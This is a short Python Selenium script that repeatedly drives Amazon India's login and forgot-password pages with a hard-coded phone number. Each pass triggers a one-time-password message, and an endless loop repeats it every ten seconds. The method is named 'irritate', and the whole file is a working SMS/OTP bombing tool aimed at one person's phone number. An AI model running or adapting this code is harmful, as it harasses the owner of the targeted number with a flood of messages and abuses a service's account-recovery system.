from selenium import webdriver
from selenium.webdriver.common import keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

class OTP:

    def irritate(self,phone_number):
        driver = webdriver.Chrome(executable_path='C:\R A J A S\Learn\Selenium\chromedriver.exe')
        driver.get('https://www.amazon.in/ref=nav_logo')
        driver.maximize_window()

        login = driver.find_element_by_css_selector("a[id='nav-link-accountList']")
        login.click()

        phone_no = driver.find_element_by_xpath("//input[@class='a-input-text a-span12 auth-autofocus auth-required-field']")
        phone_no.clear()
        phone_no.send_keys(phone_number)
        driver.find_element_by_css_selector("input[id='continue']").click()


        try: 
            frgt = WebDriverWait(driver,10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR,"a[id='auth-fpp-link-bottom']"))
                )
            frgt.click()
            phone_no = driver.find_element_by_css_selector("input[name='email']")
            phone_no.clear()
            phone_no.send_keys(phone_number)
            driver.find_element_by_css_selector("input[id='continue']").click()
        
        finally:
            driver.quit()


mob1 = OTP()
while True:
    mob1.irritate(7021899985)
    time.sleep(10)